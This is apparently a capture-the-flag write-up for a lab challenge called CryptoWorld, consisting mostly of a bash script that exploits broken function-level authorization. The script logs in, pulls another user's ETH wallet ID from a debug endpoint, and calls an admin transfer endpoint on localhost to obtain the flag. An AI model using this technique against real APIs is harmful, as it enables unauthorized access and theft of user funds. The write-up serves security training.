# CryptoWorld : Simple BOLA challenge 

## Author: h1dr1

## Description: A simple BOFLA challenge that uses a simple API to get the flag.

The same as the prvious challenge
we need to check the vulnerable debug endpoint to look for our vulnerable function
```
#!/bin/bash

# Step 1: Login as Mohamed
TOKEN=$(curl -s -X POST "http://localhost:8000/api/login" \
-H "Content-Type: application/json" \
-d '{"username":"Mohamed"}' | jq -r '.access_token')

# Step 2: Get Kamel's ETH wallet ID from debug endpoint
Kamel_wallet=$(curl -s -X GET "http://localhost:8000/api/debug" \
-H "Authorization: Bearer $TOKEN" | jq -r '.Kamel_eth_wallet_id')

# Step 3: Exploit BOFLA to get the flag
curl -X POST "http://localhost:8000/api/admin/transfer_admin/$Kamel_wallet" \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json" \
-d '{"amount": 1, "currency": "ETH"}'

```


